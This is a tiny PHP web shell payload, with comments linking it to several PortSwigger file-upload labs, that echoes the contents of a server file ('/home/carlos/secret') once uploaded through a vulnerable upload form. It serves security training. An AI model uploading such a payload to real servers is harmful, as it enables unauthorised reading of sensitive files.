<?php
    // PHP command to solve the following labs:
    // https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
    // https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
    // https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal
    // https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
    // https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
    echo file_get_contents('/home/carlos/secret');
?>
